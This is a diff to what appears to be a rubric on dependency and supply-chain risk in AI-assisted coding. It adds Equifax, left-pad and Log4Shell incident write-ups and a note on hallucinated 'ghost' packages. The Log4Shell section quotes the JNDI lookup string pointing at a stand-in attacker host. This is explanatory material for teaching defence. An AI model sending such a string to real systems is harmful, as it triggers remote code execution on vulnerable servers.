@@ -63,33 +63,122 @@ agent and has not been reviewed by a human who knows what each package does.
 
 ---
 
-## Real-world incident anchor (use for C or D grades)
+## Real-world incident anchors (use for C or D grades)
 
-**Log4Shell, December 2021.**
+---
 
-Log4j is a Java logging library — a piece of infrastructure code used by
-millions of applications to write log entries. It was present in applications
-built by companies ranging from Apple to Amazon to the US government, usually
-as a transitive dependency: a library that was included by another library,
-which was included by another library, which the development team actually
-chose.
+### Incident 1: Equifax, 2017
 
-A researcher discovered that Log4j would execute arbitrary remote code if a
-specially formatted string was logged — and any application that processed user
-input and logged it was potentially vulnerable. The attack string was eleven
-characters: `${jndi:ldap://...}`.
+**Headline.** Equifax exposed 147 million Social Security numbers in one of the
+largest data breaches in US history because a patched Apache Struts
+vulnerability sat undetected in their environment for 66 days after the fix
+was publicly available.
 
-The US Cybersecurity and Infrastructure Security Agency called it "the most
-serious vulnerability in a decade." Hundreds of millions of devices were
-potentially affected. Many organizations discovered they were running Log4j
-only when they were breached.
+**The design error.** No automated inventory existed of which framework
+versions were running in which applications. On March 7, 2017, Apache disclosed
+a critical remote code execution vulnerability in Struts and released a patch
+the same day. But applying a patch requires knowing where you are running the
+vulnerable software — and that knowledge did not exist in queryable form at
+Equifax. The breach began May 12, 2017.
 
-The lesson is not that Java is dangerous. The lesson is that every dependency
-you include — and every dependency of that dependency — is code that runs in
-your application with your application's permissions. Not knowing your
-dependency tree is not the same as not having one.
+**Why vibe-coders make the same mistake.** AI-assisted builders scaffold
+applications quickly and often copy framework versions from older tutorials or
+starter templates without noting what version they are on. The project
+launches, the framework version is never written down anywhere that a scanner
+can read, and when a CVE drops the team has no reliable way to know whether
+they are affected. Speed of initial build and absence of framework inventory
+are closely correlated.
 
-**AI-specific variant — ghost packages.**
+**What happened.** Someone in Equifax's network — likely through a web-facing
+application — sent a malicious HTTP request that exploited the Struts
+vulnerability to execute code on Equifax's server. From there, attackers moved
+laterally through internal systems for 76 days, exfiltrating names, birth
+dates, addresses, and Social Security numbers for 147 million Americans. The
+breach was detected not by Equifax's own monitoring but because a network
+inspection certificate had expired, which meant encrypted attacker traffic had
+been passing through in plaintext — unseen. Equifax's CEO, CIO, and CSO all
+resigned. The company paid over $700 million in settlements. A subsequent
+congressional investigation found that the vulnerable application had been
+missed by their scanning because it was not in the expected application
+inventory.
+
+---
+
+### Incident 2: left-pad, 2016
+
+**Headline.** A developer removed 250 of his own npm packages in a 17-minute
+dispute, including an 11-line string-padding utility, and broke the builds of
+React, Babel, and thousands of projects worldwide for several hours.
+
+**The design error.** The dependency graph included a package with no
+redundancy, no local copy, and no pinned version — meaning a third party's
+decision to withdraw from a public registry could halt deployment of
+unrelated software that had never heard of "left-pad." The package was
+installed by transitive dependency: projects depended on libraries that
+depended on left-pad, without any of those projects knowing.
+
+**Why vibe-coders make the same mistake.** AI code generation routinely adds
+dependencies for small utility functions — date formatting, string manipulation,
+UUID generation — rather than writing the function inline. Each added package
+is another link in a supply chain that extends to public registries. The
+developer never audited whether those packages were stable, maintained, or
+replaceable. The question "what happens if this package disappears tomorrow"
+is never in scope during an AI-assisted sprint.
+
+**What happened.** Azer Koculu had published over 250 packages to npm,
+including a module called "kik." An npm dispute over that name — the company
+Kik had asked npm to transfer it — led Kik to contact npm, and npm to ask
+Koculu to hand over the name. He refused and, in protest, unpublished all 250
+of his packages at once. Among them was left-pad, an 11-line function that
+pads a string to a given length with spaces or zeros. Within minutes, CI
+systems worldwide began failing. Packages that depended on left-pad (including
+major Babel and React packages) could no longer install. The npm registry
+briefly considered whether to republish the package on Koculu's behalf without
+his permission. Ultimately npm did republish it, establishing for the first
+time that npm could un-unpublish packages under extreme circumstances — a
+precedent that revealed the registry itself as a centralized point of failure
+for the JavaScript ecosystem.
+
+---
+
+### Incident 3: Log4Shell, 2021
+
+**Headline.** A single eleven-character string sent to any server running
+Log4j — a Java logging library present as a transitive dependency in hundreds
+of millions of applications — allowed an attacker to execute arbitrary code
+remotely, prompting CISA to call it "the most serious vulnerability in a
+decade."
+
+**The design error.** Log4j was present in most affected applications not
+because any developer chose it, but because it was a dependency of a
+dependency of a dependency. Teams had no inventory of their transitive
+dependency tree and discovered they were running vulnerable software only when
+they were breached or when a frantic audit revealed it.
+
+**Why vibe-coders make the same mistake.** AI-assisted builders typically add
+direct dependencies and never look at what those dependencies bring in. The
+visible `package.json` or `requirements.txt` is reviewed; the lockfile — which
+contains the full transitive tree, sometimes thousands of packages — is
+committed without inspection. The assumption is that well-known libraries have
+well-vetted dependencies. That assumption is wrong and has always been wrong.
+
+**What happened.** Log4j contained a feature called JNDI lookup that was
+intended for legitimate configuration use: if a log message contained a
+specially formatted string, Log4j would make a network request to the URL
+embedded in that string and load the result. A researcher publicly disclosed in
+December 2021 that this feature could be triggered by user-supplied input in
+any application that logged it — and almost every application logs things like
+usernames, search queries, and HTTP headers. The attack string was
+`${jndi:ldap://attacker.com/payload}`. Attackers began exploiting it within
+hours of disclosure. Many organizations discovered they were running Log4j only
+after the fact. The lesson is not that Java is dangerous. The lesson is that
+every dependency you include — and every dependency of that dependency — is
+code that runs in your application with your application's permissions. Not
+knowing your dependency tree is not the same as not having one.
+
+---
+
+### AI-specific variant: ghost packages
 
 AI coding tools sometimes generate import statements for packages that do not
 exist. When a developer installs dependencies without reviewing the list, those
@@ -97,6 +186,12 @@ package names sit empty. Attackers monitor for such names and publish malicious
 packages under them. The developer's next install silently downloads and
 executes attacker-controlled code. This attack has been observed in the wild
 and is growing in frequency as AI code generation becomes more common.
+
+The risk is compounded by the same behavior that makes left-pad-style failures
+likely: developers who do not read their dependency list before installing it
+cannot catch a name that is slightly wrong, recently published, or authored by
+an account created yesterday. All three are warning signs for either a ghost
+package or a typosquatting attack against a real one.
 
 ---
 
